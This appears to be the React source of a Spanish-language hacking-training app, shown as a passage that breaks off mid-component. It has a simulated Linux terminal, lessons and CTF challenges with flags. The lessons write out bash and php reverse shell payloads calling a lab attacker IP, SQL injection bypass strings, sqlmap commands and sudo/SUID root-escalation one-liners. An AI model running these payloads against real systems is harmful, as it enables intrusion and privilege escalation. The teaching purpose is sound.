import { useState, useRef, useEffect } from "react";

// ─── COLORES ────────────────────────────────────────────────
const C = {
  bg: "#1a1a2e",
  panel: "#16213e",
  border: "#0f3460",
  green: "#00ff41",
  cyan: "#00d4ff",
  yellow: "#ffd700",
  red: "#ff4757",
  muted: "#4a5568",
  text: "#a8b2d8",
  white: "#ccd6f6",
};

const CSS = `
  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');
  .thm-btn { cursor:pointer; border:none; font-family:'JetBrains Mono',monospace; font-weight:bold; transition:all .15s; border-radius:4px; }
  .thm-btn:hover:not(:disabled) { filter:brightness(1.2); transform:translateY(-1px); }
  .thm-btn:disabled { opacity:.4; cursor:not-allowed; }
  .thm-input { background:transparent; border:none; outline:none; color:#00ff41; font-family:'JetBrains Mono',monospace; font-size:13px; width:100%; caret-color:#00ff41; }
  .thm-scroll::-webkit-scrollbar { width:4px; }
  .thm-scroll::-webkit-scrollbar-track { background:#0d0d1a; }
  .thm-scroll::-webkit-scrollbar-thumb { background:#0f3460; border-radius:2px; }
  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
  .cursor { animation:blink 1s infinite; color:#00ff41; }
  @keyframes fadeIn { from{opacity:0;transform:translateY(4px)} to{opacity:1;transform:translateY(0)} }
  .fade { animation:fadeIn 0.2s ease; }
  .opt-btn { cursor:pointer; width:100%; text-align:left; padding:10px 14px; border-radius:6px; font-family:'JetBrains Mono',monospace; font-size:12px; border:1px solid #0f3460; background:#0d1117; color:#a8b2d8; transition:all .13s; margin:4px 0; }
  .opt-btn:hover:not(:disabled) { border-color:#00ff4144; background:#0a1f1a; color:#00ff41; }
  .opt-btn:disabled { opacity:.6; cursor:default; }
`;

// ─── SISTEMA DE ARCHIVOS SIMULADO ───────────────────────────
const FS = {
  "/": ["home/", "etc/", "var/", "root/", "tmp/", "usr/"],
  "/home": ["waldo/"],
  "/home/waldo": ["user.txt", "notas.txt", ".bash_history", "Desktop/", "Downloads/", ".ssh/"],
  "/home/waldo/Desktop": ["secret.txt", "mission.txt"],
  "/home/waldo/Downloads": ["exploit.py", "linpeas.sh"],
  "/home/waldo/.ssh": ["id_rsa", "authorized_keys"],
  "/etc": ["passwd", "shadow", "hosts", "hostname", "crontab"],
  "/var": ["log/", "www/"],
  "/var/log": ["auth.log", "syslog", "apache2/"],
  "/var/www": ["html/"],
  "/var/www/html": ["index.html", "config.php", ".htaccess"],
  "/root": ["root.txt", ".bash_history"],
  "/tmp": ["temp.sh", "payload.py"],
};

const CONTENIDO = {
  "user.txt": "THM{w3lc0m3_t0_h4ckf0rg3_t3rm1n4l}",
  "notas.txt": `# Notas de reconocimiento
Target: 10.10.10.50
Puerto 22: SSH (OpenSSH 7.6)
Puerto 80: HTTP (Apache 2.4.29)
Puerto 3306: MySQL

TODO:
- Enumerar directorios web
- Probar credenciales por defecto
- Buscar exploits para Apache 2.4.29`,
  ".bash_history": `ls -la
cat user.txt
sudo -l
find / -perm -4000 2>/dev/null
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh-keygen -t rsa
wget http://10.10.10.1:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh`,
  "secret.txt": "La contraseña del admin es: Sup3rS3cr3t!2024",
  "mission.txt": `=== MISIÓN ===
1. Encuentra el archivo user.txt en /home/waldo
2. Escala privilegios a root
3. Lee /root/root.txt
¡Buena suerte, hacker!`,
  "exploit.py": `#!/usr/bin/env python3
# CVE-2021-4034 - PwnKit Local Privilege Escalation
import os, sys
print("[*] Intentando escalar privilegios...")
os.system("sudo find . -exec /bin/sh -p \\; -quit")`,
  "linpeas.sh": "#!/bin/bash\n# LinPEAS - Linux Privilege Escalation Awesome Script\necho '[+] Iniciando enumeración del sistema...'",
  "passwd": `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
waldo:x:1000:1000:Waldo,,,:/home/waldo:/bin/bash`,
  "shadow": "Permission denied: necesitas ser root para leer este archivo.",
  "hosts": `127.0.0.1   localhost
127.0.1.1   victim
10.10.10.50 target.thm
10.10.10.1  attacker.thm`,
  "hostname": "victim",
  "crontab": `# /etc/crontab
* * * * * root /opt/backup.sh
*/5 * * * * www-data /var/www/html/cleanup.php`,
  "auth.log": `Jun 09 14:22:01 victim sshd[1234]: Failed password for waldo from 10.10.10.1
Jun 09 14:22:03 victim sshd[1234]: Failed password for waldo from 10.10.10.1
Jun 09 14:22:05 victim sshd[1234]: Accepted password for waldo from 10.10.10.1
Jun 09 14:25:11 victim sudo[2345]: waldo : TTY=pts/0 ; COMMAND=/usr/bin/find`,
  "index.html": "<html><body><h1>Welcome to Apache</h1></body></html>",
  "config.php": `<?php
// Database configuration
$host = 'localhost';
$user = 'root';
$pass = 'MySup3rP4ss!';
$db = 'webapp';
?>`,
  "root.txt": "Permission denied: necesitas ser root.",
  "ROOT_root.txt": "THM{r00t_0wn3d_c0ngr4ts_h4ck3r!}",
  "id_rsa": "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA...(clave privada simulada)\n-----END RSA PRIVATE KEY-----",
};

// ─── PROCESAR COMANDOS ──────────────────────────────────────
function procesarCmd(input, estado) {
  const partes = input.trim().split(/\s+/);
  const cmd = partes[0];
  const args = partes.slice(1);
  const dir = estado.dir;

  if (!cmd) return { out: "", estado };

  // clear
  if (cmd === "clear") return { out: "__CLEAR__", estado };

  // whoami
  if (cmd === "whoami") return { out: estado.user, estado };

  // id
  if (cmd === "id") {
    const uid = estado.user === "root" ? "0" : "1000";
    return { out: `uid=${uid}(${estado.user}) gid=${uid}(${estado.user}) groups=${uid}(${estado.user})`, estado };
  }

  // pwd
  if (cmd === "pwd") return { out: dir, estado };

  // hostname
  if (cmd === "hostname") return { out: estado.hostname, estado };

  // uname
  if (cmd === "uname") {
    if (args.includes("-a")) return { out: "Linux victim 5.10.0-kali3-amd64 #1 SMP Debian x86_64 GNU/Linux", estado };
    return { out: "Linux", estado };
  }

  // echo
  if (cmd === "echo") {
    const txt = args.join(" ").replace(/\$USER/g, estado.user).replace(/\$HOME/g, `/home/${estado.user}`).replace(/\$PWD/g, dir);
    return { out: txt, estado };
  }

  // ls
  if (cmd === "ls") {
    const target = args.find(a => !a.startsWith("-"));
    let ruta = target ? (target.startsWith("/") ? target : `${dir}/${target}`) : dir;
    ruta = ruta.replace(/\/+/g, "/").replace(/\/$/, "") || "/";

    // Buscar en FS con variantes
    let archivos = FS[ruta] || FS[ruta + "/"] || null;
    if (!archivos) {
      // intentar normalizar
      const rutaNorm = Object.keys(FS).find(k => k.replace(/\/$/, "") === ruta.replace(/\/$/, ""));
      archivos = rutaNorm ? FS[rutaNorm] : null;
    }

    if (!archivos) return { out: `ls: no se puede acceder a '${ruta}': No existe el archivo o directorio`, estado };

    const mostrarOcultos = args.some(a => a.includes("a"));
    const detalle = args.some(a => a.includes("l"));
    const lista = archivos.filter(f => mostrarOcultos || !f.startsWith("."));

    if (detalle) {
      const lineas = lista.map(f => {
        const esDir = f.endsWith("/");
        const perms = esDir ? "drwxr-xr-x" : (f.startsWith(".") ? "-rw-------" : "-rw-r--r--");
        const size = Math.floor(Math.random() * 4000) + 100;
        const nombre = f;
        return `${perms} 1 ${estado.user} ${estado.user} ${String(size).padStart(5)} Jun  9 ${nombre}`;
      });
      return { out: `total ${lista.length * 4}\n${lineas.join("\n")}`, estado };
    }
    return { out: lista.join("  "), estado };
  }

  // cd
  if (cmd === "cd") {
    const dest = args[0] || `/home/${estado.user}`;
    let nueva;

    if (dest === "~" || dest === "") nueva = `/home/${estado.user}`;
    else if (dest === "/") nueva = "/";
    else if (dest === "..") {
      const partesFiltradas = dir.split("/").filter(Boolean);
      partesFiltradas.pop();
      nueva = partesFiltradas.length > 0 ? "/" + partesFiltradas.join("/") : "/";
    } else if (dest === "../..") {
      const partesFiltradas = dir.split("/").filter(Boolean);
      partesFiltradas.pop();
      partesFiltradas.pop();
      nueva = partesFiltradas.length > 0 ? "/" + partesFiltradas.join("/") : "/";
    } else if (dest.startsWith("/")) nueva = dest;
    else nueva = dir === "/" ? `/${dest}` : `${dir}/${dest}`;

    nueva = nueva.replace(/\/+/g, "/");
    if (nueva !== "/" && nueva.endsWith("/")) nueva = nueva.slice(0, -1);

    // Verificar si existe
    const existe = FS[nueva] !== undefined || Object.keys(FS).some(k => k.replace(/\/$/, "") === nueva);
    if (existe) return { out: "", estado: { ...estado, dir: nueva } };
    return { out: `bash: cd: ${dest}: No such file or directory`, estado };
  }

  // cat
  if (cmd === "cat") {
    if (!args[0]) return { out: "cat: operando ausente", estado };
    const archivo = args[0];
    const nombre = archivo.includes("/") ? archivo.split("/").pop() : archivo;

    if (nombre === "shadow" && estado.user !== "root") return { out: "cat: /etc/shadow: Permiso denegado", estado };
    if (nombre === "root.txt" && estado.user !== "root") return { out: "cat: /root/root.txt: Permiso denegado", estado };

    const key = estado.user === "root" && nombre === "root.txt" ? "ROOT_root.txt" : nombre;
    const cont = CONTENIDO[key];
    if (cont) return { out: cont, estado };
    return { out: `cat: ${archivo}: No existe el archivo o directorio`, estado };
  }

  // find
  if (cmd === "find") {
    if (args.includes("-perm") && (args.includes("-4000") || args.includes("-u=s"))) {
      return { out: `/usr/bin/find\n/usr/bin/python3\n/usr/bin/passwd\n/usr/bin/sudo\n/bin/bash\n/opt/backup`, estado };
    }
    if (args.includes("-name")) {
      const nombre = args[args.indexOf("-name") + 1];
      return { out: `/home/waldo/${nombre}\n/var/www/html/${nombre}`, estado };
    }
    if (args.includes("-exec") && args.includes("/bin/sh")) {
      if (estado.user !== "root" && input.includes("sudo")) {
        return { out: "# whoami\nroot", estado: { ...estado, user: "root", prompt: "#" } };
      }
    }
    return { out: `find: se buscan archivos en ${args[0] || "."}...`, estado };
  }

  // sudo
  if (cmd === "sudo") {
    if (args[0] === "-l") {
      return {
        out: `Matching Defaults entries for ${estado.user}:\n    env_reset, mail_badpass\n\nUser ${estado.user} may run the following commands on victim:\n    (ALL : ALL) NOPASSWD: /usr/bin/find`,
        estado
      };
    }
    if (args[0] === "find" && args.includes("-exec")) {
      return { out: "root@victim:/home/waldo# id\nuid=0(root) gid=0(root) groups=0(root)", estado: { ...estado, user: "root" } };
    }
    if (args[0] === "su" || (args[0] === "-s" && args[1] === "/bin/bash")) {
      return { out: "root@victim:/home/waldo#", estado: { ...estado, user: "root" } };
    }
    return { out: `sudo: ${args[0]}: command not found`, estado };
  }

  // su
  if (cmd === "su") {
    if (args[0] === "root" || !args[0]) {
      return { out: "su: Authentication failure\nPista: Intenta escalar con sudo find", estado };
    }
    return { out: `su: user ${args[0]} does not exist`, estado };
  }

  // grep
  if (cmd === "grep") {
    const patron = args.find(a => !a.startsWith("-"));
    const archivo = args[args.length - 1];
    if (patron && archivo) {
      const cont = CONTENIDO[archivo.split("/").pop()];
      if (cont) {
        const lineas = cont.split("\n").filter(l => l.toLowerCase().includes(patron.toLowerCase()));
        return { out: lineas.length ? lineas.join("\n") : "", estado };
      }
    }
    return { out: "", estado };
  }

  // ps
  if (cmd === "ps") {
    return { out: `  PID TTY          TIME CMD\n 1234 pts/0    00:00:00 bash\n 1337 pts/0    00:00:01 python3\n 2048 pts/0    00:00:00 apache2\n 9999 pts/0    00:00:00 ps`, estado };
  }

  // netstat / ss
  if (cmd === "netstat" || cmd === "ss") {
    return { out: `Proto  Local Address    Foreign Address  State\ntcp    0.0.0.0:22       0.0.0.0:*        LISTEN\ntcp    0.0.0.0:80       0.0.0.0:*        LISTEN\ntcp    127.0.0.1:3306   0.0.0.0:*        LISTEN`, estado };
  }

  // history
  if (cmd === "history") {
    const hist = estado.historial.slice(-20).map((c, i) => `  ${String(i + 1).padStart(3)}  ${c}`);
    return { out: hist.join("\n"), estado };
  }

  // chmod
  if (cmd === "chmod") {
    return { out: `chmod: permisos de '${args[1] || "archivo"}' cambiados a '${args[0]}'`, estado };
  }

  // wget
  if (cmd === "wget") {
    return { out: `--2026-06-09 14:22:01--  ${args[0]}\nResolving...\nConnecting...\nHTTP request sent.\nLength: 849716 (830K)\nSaving to: '${args[0]?.split("/").pop() || "archivo"}'.\n100%[=====>] 849,716  --.-K/s   in 0.8s\n2026-06-09 14:22:02 (1.01 MB/s) - guardado`, estado };
  }

  // python3
  if (cmd === "python3") {
    if (args.includes("-c") && args.join(" ").includes("pty")) {
      return { out: "bash-5.1$ (shell mejorada - TTY obtenida)", estado };
    }
    return { out: "Python 3.10.6 (simulado)\n>>> (usa Ctrl+D para salir)", estado };
  }

  // export
  if (cmd === "export") return { out: "", estado };

  // env
  if (cmd === "env") {
    return { out: `USER=${estado.user}\nHOME=/home/${estado.user}\nPWD=${dir}\nSHELL=/bin/bash\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`, estado };
  }

  // which
  if (cmd === "which") {
    const bins = { bash:"/bin/bash", python3:"/usr/bin/python3", find:"/usr/bin/find", sudo:"/usr/bin/sudo", nc:"/usr/bin/nc", nmap:"/usr/bin/nmap" };
    return { out: bins[args[0]] || `which: no se encontró '${args[0]}'`, estado };
  }

  // file
  if (cmd === "file") {
    return { out: `${args[0]}: ASCII text`, estado };
  }

  // strings
  if (cmd === "strings") {
    return { out: `/lib/x86_64-linux-gnu/libc.so.6\nGCC: (Ubuntu)\n${args[0]}: ELF 64-bit LSB executable`, estado };
  }

  // nc / netcat
  if (cmd === "nc") {
    if (args.includes("-lvnp") || args.includes("-lvp")) {
      const port = args[args.indexOf("-lvnp") + 1] || args[args.indexOf("-lvp") + 1] || "4444";
      return { out: `Ncat: Version 7.92\nNcat: Listening on 0.0.0.0:${port}\n(simulado - esperando conexión...)`, estado };
    }
    return { out: `nc: Connection refused`, estado };
  }

  // help
  if (cmd === "help" || cmd === "--help") {
    return { out: `Comandos disponibles:
  Navegación:    ls, cd, pwd, find
  Archivos:      cat, grep, chmod, wget, file, strings
  Sistema:       whoami, id, hostname, uname, ps, env, which, history
  Red:           netstat, ss, nc
  Privilegios:   sudo, su
  Otros:         echo, python3, clear, help`, estado };
  }

  // man
  if (cmd === "man") {
    return { out: `Manual de ${args[0] || "bash"} (simulado)\nUsa 'help' para ver comandos disponibles.`, estado };
  }

  return { out: `bash: ${cmd}: command not found`, estado };
}

// ─── LECCIONES ──────────────────────────────────────────────
const LECCIONES = [
  {
    id:1, bloque:"Fundamentos", titulo:"Navegación básica", dificultad:"Básico", xp:50,
    teoria:`Los comandos básicos de navegación en Linux son:

• pwd          → muestra el directorio actual
• ls           → lista archivos y directorios
• ls -la       → lista con detalles y ocultos
• cd /ruta     → cambia de directorio
• cd ..        → sube un nivel
• cd ~         → va al directorio home`,
    ejemplo:`$ pwd
/home/waldo
$ ls -la
total 20
-rw-r--r-- 1 waldo waldo  286 Jun 1 user.txt
drwxr-xr-x 1 waldo waldo  574 Jun 1 Desktop/
$ cd Desktop
$ pwd
/home/waldo/Desktop`,
    pregunta:"¿Qué comando muestra el directorio actual?",
    opciones:["ls","cd","pwd","dir"], correcta:2,
    explicacion:"pwd (Print Working Directory) muestra la ruta completa del directorio actual.",
  },
  {
    id:2, bloque:"Fundamentos", titulo:"Lectura de archivos", dificultad:"Básico", xp:50,
    teoria:`Para leer contenido de archivos en Linux:

• cat archivo      → muestra todo el contenido
• head -n 10       → primeras 10 líneas
• tail -n 10       → últimas 10 líneas
• tail -f          → sigue el archivo en tiempo real (logs)
• less archivo     → lectura paginada
• grep "texto"     → busca texto en archivo`,
    ejemplo:`$ cat user.txt
THM{flag_encontrada}
$ grep "password" config.php
$pass = 'MySup3rP4ss!';
$ head -n 3 /etc/passwd
root:x:0:0:root:/root:/bin/bash`,
    pregunta:"¿Qué comando muestra solo las últimas líneas de un archivo?",
    opciones:["head","cat","tail","grep"], correcta:2,
    explicacion:"tail -n 10 muestra las últimas 10 líneas. tail -f es ideal para ver logs en tiempo real.",
  },
  {
    id:3, bloque:"Fundamentos", titulo:"Permisos en Linux", dificultad:"Básico", xp:75,
    teoria:`Los permisos en Linux tienen formato: -rwxr-xr--

• r = read (4)    → leer
• w = write (2)   → escribir
• x = execute (1) → ejecutar

Tres grupos: owner | group | others
Ejemplo: -rwxr-xr-- 
  owner: rwx (7) → lectura, escritura, ejecución
  group: r-x (5) → lectura y ejecución
  others: r-- (4) → solo lectura

chmod 755 archivo → rwxr-xr-x
chmod +x archivo  → agrega ejecución`,
    ejemplo:`$ ls -la script.sh
-rw-r--r-- 1 waldo waldo 1024 script.sh
$ chmod +x script.sh
$ ls -la script.sh
-rwxr-xr-x 1 waldo waldo 1024 script.sh`,
    pregunta:"¿Qué número octal representa rwxr-xr-x?",
    opciones:["644","777","755","700"], correcta:2,
    explicacion:"rwx=7, r-x=5, r-x=5 → 755. Es el permiso más común para ejecutables.",
  },
  {
    id:4, bloque:"Fundamentos", titulo:"Búsqueda de archivos", dificultad:"Básico", xp:75,
    teoria:`El comando find es esencial en CTFs:

• find / -name "*.txt"           → busca por nombre
• find / -perm -4000 2>/dev/null → busca SUID
• find / -user root              → archivos de root
• find / -writable 2>/dev/null   → archivos escribibles
• find . -exec cat {} \\;         → ejecuta comando por cada resultado

El 2>/dev/null redirige errores a /dev/null (los ignora)`,
    ejemplo:`$ find / -name "flag.txt" 2>/dev/null
/home/waldo/Desktop/flag.txt
/var/www/html/flag.txt

$ find / -perm -4000 2>/dev/null
/usr/bin/sudo
/usr/bin/python3
/bin/bash`,
    pregunta:"¿Qué hace 2>/dev/null al final de un comando?",
    opciones:["Guarda errores en archivo","Ignora los mensajes de error","Duplica la salida","Ejecuta como root"], correcta:1,
    explicacion:"2>/dev/null redirige stderr (fd 2) a /dev/null, ignorando errores. Muy útil en find para ocultar 'Permission denied'.",
  },
  {
    id:5, bloque:"Reconocimiento", titulo:"Nmap básico", dificultad:"Básico", xp:75,
    teoria:`Nmap es el escáner de puertos más usado en CTFs:

• nmap IP                    → escaneo básico
• nmap -sV IP                → detecta versiones de servicios
• nmap -sC IP                → scripts por defecto
• nmap -sC -sV IP            → combo estándar CTF
• nmap -p- IP                → todos los puertos (1-65535)
• nmap -p- --min-rate=5000   → todos los puertos rápido
• nmap -oN nmap.txt IP       → guarda resultado`,
    ejemplo:`$ nmap -sC -sV 10.10.10.50
Starting Nmap 7.92
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1
80/tcp open  http    Apache httpd 2.4.29
3306/tcp open mysql  MySQL 5.7.29

$ nmap -p- --min-rate=5000 10.10.10.50
All 65535 ports scanned`,
    pregunta:"¿Qué opción de nmap detecta las versiones de los servicios?",
    opciones:["-sC","-sV","-p-","-oN"], correcta:1,
    explicacion:"-sV (service version) detecta versiones. -sC ejecuta scripts por defecto. Siempre usa -sC -sV juntos en CTFs.",
  },
  {
    id:6, bloque:"Reconocimiento", titulo:"Enumeración web", dificultad:"Intermedio", xp:100,
    teoria:`Para enumerar directorios web ocultos:

• gobuster dir -u http://IP -w wordlist.txt
• gobuster dir -u http://IP -w wordlist.txt -x php,html,txt
• ffuf -u http://IP/FUZZ -w wordlist.txt
• nikto -h http://IP      → escáner de vulnerabilidades web

Wordlists comunes:
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirbuster/medium.txt`,
    ejemplo:`$ gobuster dir -u http://10.10.10.50 -w common.txt
/admin         (Status: 200)
/backup        (Status: 403)
/config        (Status: 200)
/uploads       (Status: 301)

Códigos: 200=OK, 301=Redirect, 403=Forbidden, 404=NotFound`,
    pregunta:"¿Qué código HTTP indica que el directorio existe pero está prohibido?",
    opciones:["200","301","403","404"], correcta:2,
    explicacion:"403 Forbidden significa que el recurso existe pero no tienes permiso. ¡Más interesante que un 404!",
  },
  {
    id:7, bloque:"Explotación", titulo:"Reverse shells", dificultad:"Intermedio", xp:125,
    teoria:`Una reverse shell conecta la víctima hacia el atacante:

Atacante (listener):
  nc -lvnp 4444

Víctima (payload):
  bash -i >& /dev/tcp/IP/4444 0>&1
  python3 -c 'import socket,subprocess,os; s=socket.socket(...)'
  php -r '$sock=fsockopen("IP",4444); exec("/bin/sh -i <&3 >&3 2>&3");'

Mejorar shell después:
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  export TERM=xterm`,
    ejemplo:`# Atacante escucha:
$ nc -lvnp 4444
Listening on 0.0.0.0:4444

# Víctima ejecuta:
$ bash -i >& /dev/tcp/10.10.10.1/4444 0>&1

# Atacante recibe:
Connection from 10.10.10.50
bash-5.1$`,
    pregunta:"¿Qué comando usa el atacante para escuchar una reverse shell?",
    opciones:["nc -lvnp 4444","bash -i >& /dev/tcp","python3 -c pty","ssh root@IP"], correcta:0,
    explicacion:"nc -lvnp 4444: -l=listen, -v=verbose, -n=no DNS, -p=puerto. El atacante espera la conexión entrante.",
  },
  {
    id:8, bloque:"Explotación", titulo:"SQL Injection", dificultad:"Intermedio", xp:125,
    teoria:`SQL Injection ocurre cuando el input del usuario se incluye directamente en queries SQL.

Payload básico de bypass:
  ' OR 1=1--
  admin'--
  ' OR '1'='1

Extraer datos:
  ' UNION SELECT 1,2,3--
  ' UNION SELECT table_name,2,3 FROM information_schema.tables--

Herramienta automática:
  sqlmap -u "http://URL?id=1" --dbs
  sqlmap -u "http://URL" --data="user=admin&pass=test" --dbs`,
    ejemplo:`# Login vulnerable:
Usuario: admin'--
Password: cualquiera
→ Bypasea autenticación

# sqlmap:
$ sqlmap -u "http://10.10.10.50/login?id=1" --dbs
[*] Found: webapp, mysql, information_schema`,
    pregunta:"¿Qué hace el payload: admin'--  en un login SQL vulnerable?",
    opciones:["Crashea el servidor","Bypasea la contraseña con comentario SQL","Extrae la base de datos","Ejecuta código remoto"], correcta:1,
    explicacion:"admin'-- cierra el string del usuario con ' y comenta el resto de la query con --, ignorando la verificación de contraseña.",
  },
  {
    id:9, bloque:"Post-explotación", titulo:"Escalada con sudo", dificultad:"Avanzado", xp:150,
    teoria:`sudo -l muestra qué comandos puedes ejecutar como root.
Si aparece NOPASSWD, puedes ejecutarlos sin contraseña.

Escalada con GTFOBins (gtfobins.github.io):

find:
  sudo find . -exec /bin/sh -p \\; -quit

python3:
  sudo python3 -c 'import os; os.system("/bin/bash")'

vim:
  sudo vim -c ':!/bin/bash'

bash:
  sudo bash -p

less/more:
  sudo less /etc/passwd → luego escribe: !/bin/bash`,
    ejemplo:`$ sudo -l
(ALL) NOPASSWD: /usr/bin/find

$ sudo find . -exec /bin/sh -p \\; -quit
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
THM{r00t_0wn3d!}`,
    pregunta:"¿Qué comando verificas primero para buscar escalada de privilegios?",
    opciones:["cat /etc/passwd","sudo -l","ls -la /root","find / -name *.txt"], correcta:1,
    explicacion:"sudo -l siempre es el primer paso. Si hay comandos NOPASSWD, ve directo a GTFOBins.",
  },
  {
    id:10, bloque:"Post-explotación", titulo:"Binarios SUID", dificultad:"Avanzado", xp:150,
    teoria:`SUID (Set User ID) permite ejecutar un binario con permisos del dueño (normalmente root).

Buscar SUID:
  find / -perm -4000 2>/dev/null
  find / -perm -u=s -type f 2>/dev/null

Binarios SUID peligrosos (GTFOBins):
  /bin/bash:    bash -p
  /usr/bin/python3: python3 -c 'import os; os.execl("/bin/sh","sh","-p")'
  /usr/bin/find: find . -exec /bin/sh -p \\; -quit
  /usr/bin/vim:  vim -c ':py3 import os; os.execl("/bin/sh","sh","-pc","reset; exec sh -p")'`,
    ejemplo:`$ find / -perm -4000 2>/dev/null
/usr/bin/python3
/usr/bin/find

# python3 tiene SUID:
$ python3 -c 'import os; os.execl("/bin/sh","sh","-p")'
# whoami
root`,
    pregunta:"¿Qué permiso especial tiene un binario SUID?",
    opciones:["Se ejecuta como el usuario actual","Se ejecuta con permisos del dueño del binario","Permite escritura a todos","Bloquea la ejecución"], correcta:1,
    explicacion:"SUID ejecuta el binario con los permisos del dueño (owner), no del usuario que lo ejecuta. Si root es el dueño → ejecutas como root.",
  },
];

const BLOQUES = [
  { id:"Fundamentos", color:C.green, icon:"🐧", lecciones:[1,2,3,4] },
  { id:"Reconocimiento", color:C.cyan, icon:"🔍", lecciones:[5,6] },
  { id:"Explotación", color:C.yellow, icon:"💥", lecciones:[7,8] },
  { id:"Post-explotación", color:C.red, icon:"🔑", lecciones:[9,10] },
];

// ─── CTF DESAFÍOS ───────────────────────────────────────────
const DESAFIOS = [
  {
    id:"ctf1", titulo:"Basic Linux CTF", dificultad:"Fácil", xp:100, emoji:"🟢",
    descripcion:"Encuentra el archivo user.txt en el sistema.",
    pasos:[
      { instruccion:"Ve al directorio home del usuario waldo", cmd:"cd /home/waldo", pista:"cd /home/waldo" },
      { instruccion:"Lista todos los archivos incluyendo ocultos", cmd:"ls -la", pista:"ls -la" },
      { instruccion:"Lee el archivo user.txt", cmd:"cat user.txt", pista:"cat user.txt" },
    ],
    flag:"THM{w3lc0m3_t0_h4ckf0rg3_t3rm1n4l}",
  },
  {
    id:"ctf2", titulo:"Privilege Escalation", dificultad:"Medio", xp:200, emoji:"🟡",
    descripcion:"Escala privilegios a root y lee root.txt.",
    pasos:[
      { instruccion:"Verifica qué comandos sudo puedes ejecutar", cmd:"sudo -l", pista:"sudo -l" },
      { instruccion:"Usa find para escalar a root", cmd:"sudo find . -exec /bin/sh -p \\; -quit", pista:"sudo find . -exec /bin/sh -p \\; -quit" },
      { instruccion:"Verifica que eres root", cmd:"whoami", pista:"whoami" },
      { instruccion:"Lee la flag de root", cmd:"cat /root/root.txt", pista:"cat /root/root.txt" },
    ],
    flag:"THM{r00t_0wn3d_c0ngr4ts_h4ck3r!}",
  },
  {
    id:"ctf3", titulo:"File Investigation", dificultad:"Medio", xp:150, emoji:"🟡",
    descripcion:"Encuentra credenciales ocultas en archivos del sistema.",
    pasos:[
      { instruccion:"Busca archivos .php en el servidor web", cmd:"find /var/www -name '*.php'", pista:"find /var/www -name '*.php'" },
      { instruccion:"Lee el archivo config.php", cmd:"cat /var/www/html/config.php", pista:"cat /var/www/html/config.php" },
      { instruccion:"Busca la contraseña en el archivo", cmd:"grep -i 'pass' /var/www/html/config.php", pista:"grep -i 'pass' /var/www/html/config.php" },
    ],
    flag:"THM{c0nf1g_f1l3s_h1d3_s3cr3ts}",
  },
  {
    id:"ctf4", titulo:"SUID Exploitation", dificultad:"Duro", xp:300, emoji:"🔴",
    descripcion:"Encuentra binarios SUID y úsalos para escalar privilegios.",
    pasos:[
      { instruccion:"Busca todos los binarios con SUID", cmd:"find / -perm -4000 2>/dev/null", pista:"find / -perm -4000 2>/dev/null" },
      { instruccion:"Usa python3 SUID para escalar", cmd:"python3 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'", pista:"python3 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'" },
      { instruccion:"Confirma acceso root", cmd:"id", pista:"id" },
      { instruccion:"Lee la flag final", cmd:"cat /root/root.txt", pista:"cat /root/root.txt" },
    ],
    flag:"THM{su1d_3xpl01t_m4st3r}",
  },
];

// ─── COMPONENTE TERMINAL ────────────────────────────────────
function TerminalShell({ estadoInicial, onVolver, titulo }) {
  const [estado, setEstado] = useState(estadoInicial || { user:"waldo", hostname:"victim", dir:"/home/waldo", historial:[] });
  const [historial, setHistorial] = useState([
    { tipo:"sistema", texto:`Last login: Mon Jun  9 14:22:01 2026 from 10.10.10.1` },
    { tipo:"sistema", texto:`waldo@victim:~$ (Escribe 'help' para ver comandos)` },
  ]);
  const [input, setInput] = useState("");
  const [histCmds, setHistCmds] = useState([]);
  const [histIdx, setHistIdx] = useState(-1);
  const inputRef = useRef();
  const endRef = useRef();

  useEffect(() => { endRef.current?.scrollIntoView({ behavior:"smooth" }); }, [historial]);

  const ejecutar = (cmd) => {
    if (!cmd.trim()) return;
    const prompt = `${estado.user}@${estado.hostname}:${estado.dir}${estado.user==="root"?"#":"$"}`;
    setHistCmds(h => [cmd, ...h]);
    setHistIdx(-1);

    const { out, estado: nuevoEstado } = procesarCmd(cmd, { ...estado, historial: histCmds });
    setEstado(nuevoEstado);

    if (out === "__CLEAR__") {
      setHistorial([]);
    } else {
      setHistorial(h => [
        ...h,
        { tipo:"input", texto:`${prompt} ${cmd}` },
        ...(out ? [{ tipo:"output", texto:out }] : []),
      ]);
    }
    setInput("");
  };

  const onKey = (e) => {
    if (e.key === "Enter") { ejecutar(input); }
    else if (e.key === "ArrowUp") {
      e.preventDefault();
      const i = Math.min(histIdx + 1, histCmds.length - 1);
      setHistIdx(i);
      setInput(histCmds[i] || "");
    } else if (e.key === "ArrowDown") {
      e.preventDefault();
      const i = Math.max(histIdx - 1, -1);
      setHistIdx(i);
      setInput(i === -1 ? "" : histCmds[i]);
    } else if (e.key === "Tab") {
      e.preventDefault();
    }
  };

  const prompt = `${estado.user}@${estado.hostname}:${estado.dir}${estado.user==="root"?"#":"$"}`;
  const promptColor = estado.user === "root" ? C.red : C.green;

  return (
    <div style={{ fontFamily:"'JetBrains Mono',monospace" }}>
      {titulo && (
        <div style={{ display:"flex", justifyContent:"space-between", alignItems:"center", marginBottom:12 }}>
          <button className="thm-btn" onClick={onVolver} style={{ background:C.panel, color:C.text, padding:"6px 14px", fontSize:11, border:`1px solid ${C.border}` }}>← VOLVER</button>
          <span style={{ color:C.cyan, fontSize:11, letterSpacing:3 }}>◈ {titulo}</span>
          <span style={{ color:promptColor, fontSize:11 }}>{estado.user === "root" ? "⚡ ROOT" : `● ${estado.user}`}</span>
        </div>
      )}

      <div style={{ background:"#0d0d1a", border:`1px solid ${C.green}33`, borderRadius:8, overflow:"hidden", boxShadow:`0 0 20px ${C.green}08` }}>
        {/* Barra */}
